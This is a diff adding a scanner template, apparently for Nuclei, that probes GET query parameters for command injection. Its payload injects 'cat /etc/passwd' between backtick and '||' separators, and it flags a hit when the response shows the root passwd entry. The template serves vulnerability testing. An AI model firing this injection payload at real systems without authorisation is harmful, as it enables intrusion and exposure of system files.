@@ -1,0 +1,34 @@
+id: RCE-Found
+
+info:
+  name: Remote Code Execution Detection (Refined)
+  author: skalvin
+  severity: critical
+  tags: rce,linux,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      linux_rce:
+        - "`||cat /etc/passwd||"
+
+    fuzzing:
+      - part: query
+        type: replace       # Replace the parameter value entirely
+        mode: single
+        fuzz:
+          - "{{linux_rce}}"
+
+    stop-at-first-match: false  # Continue testing all payloads even if one is found
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:x:0:0:"    # Common pattern in /etc/passwd to match root entry
+        name: "passwd_match"  # Tag for passwd matcher
